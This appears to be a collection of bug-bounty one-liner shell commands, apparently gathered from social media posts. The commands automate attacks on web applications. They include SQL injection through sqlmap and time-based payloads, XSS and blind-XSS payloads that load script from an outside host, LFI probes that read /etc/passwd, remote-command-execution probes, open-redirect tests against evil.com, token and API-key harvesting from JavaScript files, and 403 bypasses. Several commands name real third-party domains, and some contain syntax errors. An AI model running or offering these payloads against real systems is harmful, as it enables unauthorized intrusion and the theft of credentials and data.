SQL Injection:


waybackurls testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"


Extract all URL from Source Code

curl "https://target.com/" | grep -oP '(https*://|www\.)[^ ]*'


XSS :

waybackurls testphp.vulnweb.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable-XSS-by-1br0;done


Open Redirect:

 gau testphp.vulnweb.com | grep -Ei '(\?|&)(url|redirect|next|to|r|dest|destination|redir)=' | xargs -P10 -I{} bash -c 'final=$(curl -s -L -o /dev/null -w "%{url_effective}" "{}https://evil.com"); [[ "$final" == *"evil.com"* ]] && echo "[+] Open Redirect: {} -> $final"'


Extract Sensitive info from .js files

gau ajakcyberacademy.com | grep -iE "\.js(\?|$)" | sort -u | \
xargs -P10 -I{} sh -c '
matches=$(curl -s "{}" | grep -Eio "(apikey|api_key|secret|token|password|auth|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35})" | sort -u | tr "\n" "," | sed "s/,$//");
if [ -n "$matches" ]; then
  echo "{\"url\": \"{}\", \"matches\": [\"$(echo $matches | sed "s/,/\", \"/g")\"]}";
fi
' | jq -s .




Filter Out live status code:

while read url; do curl -s -o /dev/null -w "%{http_code} $url\n" "$url"; done < virustotal_subenum.txt 


Banner Grabbing:
curl -s 'https://lnkd.in/g_2Xbqp4' | grep 'Version'


To check Sites Running in Wordpress:
subfinder -d nasa.gov  | xargs -P10 -I{} bash -c 'curl -s -L "http://{}" | grep -qi "wp-content" && echo "[+] WordPress: http://{}"' 

To check what plugins use in WP:
subfinder -d nasa.gov | xargs -P10 -I{} bash -c '
plugins=$(curl -s -L "http://{}" | grep -oP "wp-content/plugins/[^/]+(?:/[^/]+)?" | sort -u);
if [ -n "$plugins" ]; then
  while read -r plugin; do
    version=$(curl -s -L "http://{}" | grep -oP "$plugin[^\" ]*" | grep -oP "ver=[0-9\.]+" | head -n1 | sed "s/ver=//");
    echo "{\"domain\":\"{}\",\"plugin\":\"$plugin\",\"version\":\"${version:-unknown}\"}";
  done <<< "$plugins"
fi
' | jq -s













Test XSS(one liner) with :-

CVE-2022-0378 🐞🐞

cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done


Try One Liner Check For 🛤️🛤️

Prototype Pollution 🏭🏭

subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


One Liner ☝️☝️

Extract Endpoints from JavaScript 🕵️🕵️

cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u



Try one liner 🏑🏑

Find JavaScript Files (with sensitive data) 🕸️🕸️

assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done


Try One Liner 📬📬

Cross Site Scripting (XSS) 🌴🌴

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt'




Try One Liner 📮📮

Local File Inclusion - (LFI) 🌴🌴

gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'




Find Tokens and .Js and Secrets

echo targetdomain[.]com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt


Header based SQLI

#httpx
cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'

#ffuf

ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z

To avoid false positive, I use this command:

ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z" -c 200 -o json --timeout 6

For wordlist and multiple Headers:

ffuf -w headers.txt -u <target> -H "User-Agent: FUZZ" -c 200 -o json



X-Forwaded XSS
subfinder -d http://target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht
></script>' -header "X-Forwarded-For"


SQL Injection

cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Ibrahim\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done

SQLI automation using Waybackurls

waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"



SQL with sitemap.xml with HTTPX

httpx -silent -path '/sitemap,xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


subfinder -d <target> -silent -all | httpx -silent -path "/sitemap.xml?offset=1" -mc 200 -follow-redirects


target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#


Automation oneliner way to find a Local File Inclusion : 

python3 paramspider.py -d testphp.vulnweb.com -o urls.txt | while read URL; do ffuf -u "${URL}FUZZ" -mr 'root:x' -c -w lfi-payloads.txt -ac; done 




🧑🏻‍💻{One-Liner) - Extract all URL from Source Code

➡️ curl "https://target.com/" | grep -oP '(https*://|www\.)[^ ]*'






Simple way to search for RCE vulns!
For the n00wbies: RCE vulnerabilities allow an attacker to execute arbitrary code on a remote device. 

cat subdomains.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 




#MyAutomationWay for SQLi Injection 
1 subfinder -d target.com | tee -a domains.txt
2 cat domains.txt | httpx|tee -a urls-alive.txt
3 cat urls-alive.txt | waybackurls |tee -a urls-check.txt
4 gf sqli urls-check.txt >> sql.url
5 sqlmap -m sql.url --dbs --batch



#hashtag#TIME BASED SQL:

gau example.com | sed 's/=[^=&]*/=" or sleep(5)#/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done

Gather all URLS from waybackarchive,commoncrawl,alienvault 

echo nasa.gov | katana -passive -f qurl -pss waybackarchive,commoncrawl,alienvault | tee endpoints





Always check your one-liner before starting to hunt for XSS! I'll share below how I do it my way :)
hashtag#Command: 

waybackurls testphp.vulnweb.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable-XSS-by-1br0;done


Blind XSS 

findomain -t http://TARGET.COM | gau | bxss -payload '"><script src=https://target.com></script>' -header "X-Forwarded-For"






XSS Checks Made Easy 🌐

Example: Execute XSS checks on a list of URLs with a single command.

One-Liner: cat urls.txt | dalfox pipe --multicast -o xss.txt

Uncover Hidden Parameters in Seconds 🕵️‍♂️

Example: Extract hidden parameters from URLs effortlessly.

ONE LINER:
cat alive.txt |rush curl -skl “{}” |grep “type\=\”hidden\”” |grep -Eo “name\=\”[^\”]+\”” |cut -d”\”” -f2 | sort -u’ | anew params.txt

Reveal Secrets in JavaScript Files 🕵️‍♂️

Example: Identify sensitive data in JavaScript files like a pro.

One-Liner:
cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder

Crush Directories with Effortless Bruteforce 🔍

Example: Discover hidden directories and files effortlessly.

One-Liner:
cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt

Expose Log4J Vulnerabilities with Ease 🔍

Example: Identify Log4J vulnerabilities on the fly.

One-Liner:
cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u @"

Hunt Down Sneaky Open Redirect🎯

Example: Uncover open redirects like a seasoned hunter.

One-Liner:
gau http://vuln.target.com | gf redirect | qsreplace “$LHOST” | xargs -I % -P 25 sh -c ‘curl -Is “%” 2>&1 | grep -q “Location: $LHOST” && echo “VULN! %”’

Capture Screenshots in a Snap 📷

Example: Capture screenshots of live websites effortlessly.

One-Liner:
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'

Know Your WordPress Version 📝

Example: Discover the WordPress version of a target website instantly.

One-Liner:
curl -s 'https://lnkd.in/g_2Xbqp4' | grep 'Version'

Unearth Subdomains Containing JavaScript 🌐

Example: Find subdomains with JavaScript files in a snap.

One-Liner:
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS

Bypass 403 Login Pages with Finesse 🚪

Example: Bypass 403 login pages like a pro.

One-Liner:
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
